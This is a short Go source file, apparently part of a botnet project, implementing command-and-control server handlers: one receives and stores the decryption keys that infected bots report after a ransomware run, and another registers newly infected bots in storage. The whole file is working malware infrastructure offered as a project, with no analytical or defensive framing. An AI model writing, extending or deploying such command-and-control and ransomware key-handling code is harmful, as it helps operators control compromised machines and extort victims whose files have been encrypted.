package tcp

import (
	"bytes"
	"encoding/gob"
	"encoding/hex"
	"log"

	"github.com/rodzzlessa24/botnet"
)

//ransomCompleteRequest is
type ransomCompleteRequest struct {
	BotID []byte
	Key   []byte
}

//HandleRansomComplete is
func (c *CommanderService) HandleRansomComplete(payload []byte) {
	req := new(ransomCompleteRequest)
	if err := gob.NewDecoder(bytes.NewReader(payload)).Decode(req); err != nil {
		log.Panic(err)
	}

	botnet.Debug("bot id", req.BotID)
	botnet.Debug("key to decrypt", hex.EncodeToString(req.Key))

	if err := c.Storage.AddRansomKey(req.BotID, req.Key); err != nil {
		log.Fatal(err)
	}
}

//HandleGensis is
func (c *CommanderService) HandleGensis(payload []byte) {
	bot, err := botnet.BytesToBot(payload)
	if err != nil {
		log.Panic(err)
	}

	if _, err := c.Storage.AddBot(bot); err != nil {
		log.Panic(err)
	}
	botnet.Msg("bot was added")
}
